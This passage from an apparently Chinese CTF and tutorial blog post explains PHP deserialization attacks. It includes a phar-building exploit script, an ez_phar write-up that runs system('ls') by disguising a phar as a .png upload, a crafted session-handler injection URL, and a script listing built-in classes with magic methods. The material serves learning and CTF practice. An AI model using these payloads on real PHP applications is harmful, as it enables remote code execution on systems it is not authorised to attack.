class="variable">$flag</span>;</span><br><span class="line">        <span class="comment">// 输出$flag——这是漏洞利用的最终目标（获取flag）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 清理旧文件：避免同名文件导致创建失败</span></span><br><span class="line"><span class="comment">// @：抑制unlink的错误（比如文件不存在时的报错）</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exp1.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建phar文件核心流程</span></span><br><span class="line"><span class="comment">// 实例化Phar类，创建exp1.phar文件（后缀必须是.phar，PHP识别phar文件的基础）</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp1.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启phar缓冲区：所有操作先写入内存，不直接刷到磁盘（避免频繁IO）</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置phar的Stub（标识头）：必须以&lt;?php __HALT_COMPILER(); ?&gt;结尾，PHP才能识别为phar文件</span></span><br><span class="line"><span class="comment">// 这是phar文件的“身份标识”，无此内容PHP不会解析为phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关键：创建funny类的实例（对象）</span></span><br><span class="line"><span class="variable">$b</span> =<span class="keyword">new</span> <span class="title function_ invoke__">funny</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将funny对象存入phar的元数据（metadata）</span></span><br><span class="line"><span class="comment">// 注意注释：不用手动serialize()——Phar类会自动将传入的对象序列化后存入manifest（清单）</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向phar归档中添加一个空文件（test.txt），内容为&quot;test&quot;</span></span><br><span class="line"><span class="comment">// 核心要求：phar文件必须包含至少一个文件内容（否则创建失败），这行是满足格式要求的“占位符”</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结束缓冲区：将内存中的操作刷到磁盘，自动计算phar文件的签名（完成创建）</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 读取并编码phar文件内容</span></span><br><span class="line"><span class="comment">// 读取生成的exp1.phar文件的二进制内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;exp1.phar&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先base64编码（处理二进制内容），再urlencode（避免传输时乱码），最后换行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/phar.png" class="" title="phar">

<p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/phar%E5%BD%B1%E5%93%8D.png" class="" title="phar影响">

<h3 id="HNCTF-2022-WEEK3-ez-phar"><a href="#HNCTF-2022-WEEK3-ez-phar" class="headerlink" title="[HNCTF 2022 WEEK3]ez_phar"></a>[HNCTF 2022 WEEK3]ez_phar</h3><p>这道例题直接进去给了我们这些信息：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>还提示我们要upload something</p>
<p>dirsearch扫一下就可以知道这里存在一个upload.php，并且上传的文件保存在&#x2F;upload下</p>
<p>利用phar文件生成的php代码，我们实例化一个Flag类之后将code赋值为system(‘ls’);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt;code  = <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>我们尝试上传这一个.phar文件，不过给了我们这样一个警告：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only jpg png jpeg</span><br></pre></td></tr></table></figure>

<p>不过这也无伤大雅，我们可以把phar文件的后缀名修改为png，由于phar协议的特性让上传的.png文件也可以被解压缩，（详细看本博客上一篇SSRF各种协议）</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ls.png" class="" title="ls">

<p>修改phar文件内容，ls &#x2F;能看到ffflllaaaggg</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ez.png" class="" title="ez">

<h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><p>内容来自：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/324519.html">https://www.freebuf.com/articles/web/324519.html</a></p>
<p>在学习session反序列化之前我们先来了解一些处理器和配置项：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;/tmp&quot;      --设置session文件的存储位置</span><br><span class="line">session.save_handler=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start= 0          --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</span><br><span class="line">session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="line">session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup= oN --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure>

<h3 id="PHP-session序列化机制"><a href="#PHP-session序列化机制" class="headerlink" title="PHP session序列化机制"></a>PHP session序列化机制</h3><p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th align="center">处理器</th>
<th align="center">对应的存储格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php</td>
<td align="center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_binary</td>
<td align="center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_serialize (php&gt;&#x3D;5.5.4)</td>
<td align="center">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody></table>
<h3 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h3><p>1.首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%BB%98%E8%AE%A4.png" class="" title="默认">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag|s:14:&quot;ZLARYY&#123;2l47yY&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>可见默认下存储格式为键名+|加上序列化字符串</p>
<p>在看大佬文章的时候我就想试试如果键名为空会发生什么：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;FLAG&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<p>的确能输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(14) &quot;ZLARYY&#123;2l47yY&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>但是session文件是空的</p>
<p><strong>2.php_serialize处理器：</strong></p>
<p>即<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;flag1&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;flag1&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag1&#x27;</span>];</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/serialize.png" class="" title="serialize">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:5:&quot;flag1&quot;;s:14:&quot;ZLARYY&#123;2l47yY&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>文件内容即经过 serialize() 函数反序列处理的数组</p>
<p><strong>3.php_binary处理器：</strong></p>
<p>即<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sevensevensevensevensevensevenseven&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;sevensevensevensevensevensevenseven&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;sevensevensevensevensevensevenseven&#x27;</span>];</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/binary.png" class="" title="binary">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#sevensevensevensevensevensevensevens:14:&quot;ZLARYY&#123;2l47yY&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>为了方便展示这里用了长度为35，ASCII字符为#的键名，这里键名最后的s表示String</p>
<h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><p>session的反序列化漏洞，就是利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</p>
<p>首先创建<code>session.php</code>，使用<code>php_serialize</code>处理器来存储session数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>接着再创建一个liu.php，使用默认php处理器来存储session数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;im ready to be unserialized&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Finished&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着，我们构建URL进行访问<code>session.php</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ZLARYY.com/session.php?session=|O:6:&quot;ZLARYY&quot;:3:&#123;s:6:&quot;xiexie&quot;;s:9:&quot;phpinfo()&quot;;s:8:&quot;Chesmond&quot;;N;s:5:&quot;Arach&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session.png" class="" title="session">

<p>打开<code>PHPSESSID</code>文件可看到序列化存储的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:78:&quot;|O:6:&quot;ZLARYY&quot;:3:&#123;s:6:&quot;xiexie&quot;;s:9:&quot;phpinfo()&quot;;s:8:&quot;Chesmond&quot;;N;s:5:&quot;Arach&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这时，由于浏览器中保存的PHPSEED文件名不变，当我们把用session.php生成的PHPSEEID文件一并带去访问另一个liu.php，再加上liu.php的PHPSEEID文件存储形式为默认，那么就会把|后面的内容反序列化，造成如下结果：</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/result.png" class="" title="result">

<p><strong>注：反序列化字符串这个行为不会触发__construct()</strong></p>
<p>php session工作流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以PHP为例，理解session的原理</span><br><span class="line">1.PHP脚本使用 session_start()时开启session会话，会自动检测PHPSESSID</span><br><span class="line">    如果Cookie中存在，获取PHPSESSID</span><br><span class="line">    如果Cookie中不存在，创建一个PHPSESSID，并通过响应头以Cookie形式保存到浏览器</span><br><span class="line">2.初始化超全局变量$_SESSION为一个空数组</span><br><span class="line">3.PHP通过PHPSESSID去指定位置（PHPSESSID文件存储位置）匹配对应的文件</span><br><span class="line">    存在该文件：读取文件内容（通过反序列化方式），将数据存储到$_SESSION中</span><br><span class="line">    不存在该文件： session_start()创建一个PHPSESSID命名文件</span><br><span class="line">4.程序执行结束，将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中</span><br></pre></td></tr></table></figure>

<h2 id="原生类反序列化"><a href="#原生类反序列化" class="headerlink" title="原生类反序列化"></a>原生类反序列化</h2><p>在学习这一块的时候注意到了一篇文章用脚本枚举了有魔术方法的所有内置类:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">Exception::__wakeup</span><br><span class="line">Exception::__toString</span><br><span class="line">ErrorException::__wakeup</span><br><span class="line">ErrorException::__toString</span><br><span class="line">Error::__wakeup</span><br><span class="line">Error::__toString</span><br><span class="line">CompileError::__wakeup</span><br><span class="line">CompileError::__toString</span><br><span class="line">ParseError::__wakeup</span><br><span class="line">ParseError::__toString</span><br><span class="line">TypeError::__wakeup</span><br><span class="line">TypeError::__toString</span><br><span class="line">ArgumentCountError::__wakeup</span><br><span class="line">ArgumentCountError::__toString</span><br><span class="line">ValueError::__wakeup</span><br><span class="line">ValueError::__toString</span><br><span class="line">ArithmeticError::__wakeup</span><br><span class="line">ArithmeticError::__toString</span><br><span class="line">DivisionByZeroError::__wakeup</span><br><span class="line">DivisionByZeroError::__toString</span><br><span class="line">UnhandledMatchError::__wakeup</span><br><span class="line">UnhandledMatchError::__toString</span><br><span class="line">ClosedGeneratorException::__wakeup</span><br><span class="line">ClosedGeneratorException::__toString</span><br><span class="line">FiberError::__wakeup</span><br><span class="line">FiberError::__toString</span><br><span class="line">DateTime::__wakeup</span><br><span class="line">DateTime::__set_state</span><br><span class="line">DateTimeImmutable::__wakeup</span><br><span class="line">DateTimeImmutable::__set_state</span><br><span class="line">DateTimeZone::__wakeup</span><br><span class="line">DateTimeZone::__set_state</span><br><span class="line">DateInterval::__wakeup</span><br><span class="line">DateInterval::__set_state</span><br><span class="line">DatePeriod::__wakeup</span><br><span class="line">DatePeriod::__set_state</span><br><span class="line">JsonException::__wakeup</span><br><span class="line">JsonException::__toString</span><br><span class="line">Random\RandomError::__wakeup</span><br><span class="line">Random\RandomError::__toString</span><br><span class="line">Random\BrokenRandomEngineError::__wakeup</span><br><span class="line">Random\BrokenRandomEngineError::__toString</span><br><span class="line">Random\RandomException::__wakeup</span><br><span class="line">Random\RandomException::__toString</span><br><span class="line">ReflectionException::__wakeup</span><br><span class="line">ReflectionException::__toString</span><br><span class="line">ReflectionFunctionAbstract::__toString</span><br><span class="line">ReflectionFunction::__toString</span><br><span class="line">ReflectionParameter::__toString</span><br><span class="line">ReflectionType::__toString</span><br><span class="line">ReflectionNamedType::__toString</span><br><span class="line">ReflectionUnionType::__toString</span><br><span class="line">ReflectionIntersectionType::__toString</span><br><span class="line">ReflectionMethod::__toString</span><br><span class="line">ReflectionClass::__toString</span><br><span class="line">ReflectionObject::__toString</span><br><span class="line">ReflectionProperty::__toString</span><br><span class="line">ReflectionClassConstant::__toString</span><br><span class="line">ReflectionExtension::__toString</span><br><span class="line">ReflectionZendExtension::__toString</span><br><span class="line">ReflectionAttribute::__toString</span><br><span class="line">ReflectionEnum::__toString</span><br><span class="line">ReflectionEnumUnitCase::__toString</span><br><span class="line">ReflectionEnumBackedCase::__toString</span><br><span class="line">LogicException::__wakeup</span><br><span class="line">LogicException::__toString</span><br><span class="line">BadFunctionCallException::__wakeup</span><br><span class="line">BadFunctionCallException::__toString</span><br><span class="line">BadMethodCallException::__wakeup</span><br><span class="line">BadMethodCallException::__toString</span><br><span class="line">DomainException::__wakeup</span><br><span class="line">DomainException::__toString</span><br><span class="line">InvalidArgumentException::__wakeup</span><br><span 